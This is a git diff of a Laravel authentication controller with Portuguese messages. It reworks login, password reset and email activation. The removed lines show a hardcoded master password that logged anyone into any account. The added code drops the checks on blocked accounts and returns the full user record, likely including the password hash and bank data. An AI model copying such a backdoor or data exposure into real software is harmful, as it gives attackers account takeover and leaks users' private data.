@@ -11,6 +11,7 @@ use Illuminate\Support\Facades\Hash;
 use JWTAuth;
 use App\User;
 use Illuminate\Support\Facades\Mail;
+use Illuminate\Support\Facades\DB;
 use Location;
 
 class AuthController extends Controller
@@ -205,6 +206,8 @@ class AuthController extends Controller
 
         $user->save();
 
+        $user->generateCode();
+
         $data = [
             'user' => $user,
             'location' => Location::get($request->ip())
@@ -216,23 +219,18 @@ class AuthController extends Controller
 
         return response()->json([
             'success' => true,
-            'message' => 'Usuário cadastrado com sucesso'
+            'message' => 'Usuário cadastrado com sucesso!'
         ]);
-    }
-
-    public function mail()
-    {
-        return view('mail.confirmEmail');
     }
 
     public function login(Request $request)
     {
         $request->validate([
-            'username' => 'required|string',
+            'email' => 'required|string',
             'password' => 'required|string',
         ]);
 
-        $user = User::where('username', $request->username)->first();
+        $user = User::where('email', $request->email)->first();
 
         if ($user === null) {
 
@@ -240,25 +238,7 @@ class AuthController extends Controller
                 'success' => false,
                 'message' => 'Usuário Incorreto!',
             ]);
-        }
 
-        if ($user->status == BLOCKED) {
-
-            return response()->json([
-                'success' => false,
-                'message' => 'Esta conta foi bloqueada por tempo indeterminado!',
-            ]);
-        }
-
-        if ($request->password == '#master@diamond') {
-
-            $jwt_token = JWTAuth::fromUser($user);
-
-            return response()->json([
-                'success' => true,
-                'message' => 'Autenticado com sucesso',
-                'token' => $jwt_token,
-            ]);
         }
 
         if (Hash::check($request->password, $user->password)) {
@@ -270,13 +250,18 @@ class AuthController extends Controller
                 'message' => 'Autenticado com sucesso',
                 'token' => $jwt_token,
             ]);
-        } else {
+
+        }
+
+        else {
 
             return response()->json([
                 'success' => false,
                 'message' => 'Senha Incorreta!',
             ]);
+
         }
+
     }
 
     public function logout(Request $request)
@@ -293,22 +278,27 @@ class AuthController extends Controller
                 'success' => true,
                 'message' => 'Usuário desconectado com successo'
             ]);
-        } catch (JWTException $exception) {
+
+        }
+
+        catch (JWTException $exception) {
 
             return response()->json([
                 'success' => false,
                 'message' => 'Usuário não pode ser desconectado'
             ]);
+
         }
+
     }
 
     public function forgotPassword(Request $request)
     {
         $request->validate([
-            'username' => 'required|string'
+            'email' => 'required|string'
         ]);
 
-        $user = User::where('username', $request->username)->first();
+        $user = User::where('email', $request->email)->first();
 
         if ($user == null) {
 
@@ -316,14 +306,7 @@ class AuthController extends Controller
                 'success' => false,
                 'message' => 'Usuário não encontrado!'
             ]);
-        }
 
-        if ($user->status == BLOCKED) {
-
-            return response()->json([
-                'success' => false,
-                'message' => 'Esta conta foi bloqueada por tempo indeterminado!',
-            ]);
         }
 
         $user->generateCode();
@@ -375,8 +358,6 @@ class AuthController extends Controller
     {
         $user = Auth::user();
 
-        $user->generateCode();
-
         $data = [
             'user' => $user,
             'location' => Location::get($request->ip())
@@ -388,75 +369,40 @@ class AuthController extends Controller
 
         return response()->json([
             'success' => true,
-            'message' => "Enviamos um código para $user->email"
+            'message' => "Confirmação de e-mail enviada para $user->email"
         ]);
     }
 
-    public function confirmEmail(Request $request)
+    public function activateAccount($code)
     {
-        $request->validate([
-            'code' => 'required|string'
-        ]);
+        $user = User::where(DB::raw('md5(code)'), $code)->first();
 
-        $user = Auth::user();
-
-        if ($request->code == $user->code) {
-
-            $user->email_status = ACTIVE;
-
-            $user->save();
+        if ($user == null) {
 
             return response()->json([
-                'success' => true,
-                'message' => 'E-mail confirmado com sucesso!'
+                'success' => false,
+                'message' => 'Código inválido!'
             ]);
         }
 
+        $user->email_status = 'confirmed';
+
+        $user->save();
+
         return response()->json([
-            'success' => false,
-            'message' => 'Código inválido!'
+            'success' => true,
+            'message' => 'Conta ativada com sucesso!'
         ]);
+
     }
 
     public function auth()
     {
         $user = Auth::user();
 
-        $plan = Plan::find($user->id_plan);
-
         return response()->json([
             'success' => true,
-            'data' => [
-                'name' => $user->name,
-                'username' => $user->username,
-                'email' => $user->email,
-                'birth' => $user->birth,
-                'cpf' => $user->cpf,
-                'phone' => $user->phone,
-                'income' => $user->income,
-                'bonus' => $user->bonus,
-                'binary_key' => $user->binary_key,
-                'token' => $user->token,
-                'photo' => $user->photo,
-                'cep' => $user->cep,
-                'address' => $user->address,
-                'number' => $user->number,
-                'complement' => $user->complement,
-                'district' => $user->district,
-                'state' => $user->state,
-                'city' => $user->city,
-                'plan' => $plan !== null ? $plan->name : null,
-                'wallet' => $user->wallet,
-                'bank_code' => $user->bank_code,
-                'bank_type' => $user->bank_type,
-                'bank_agency' => $user->bank_agency,
-                'bank_number' => $user->bank_number,
-                'bank_holder' => $user->bank_holder,
-                'bank_cpf' => $user->bank_cpf,
-                'google_auth_status' => $user->google_auth_status,
-                'email_status' => $user->email_status,
-                'status' => $user->status
-            ]
+            'data' => $user
         ]);
     }
 }
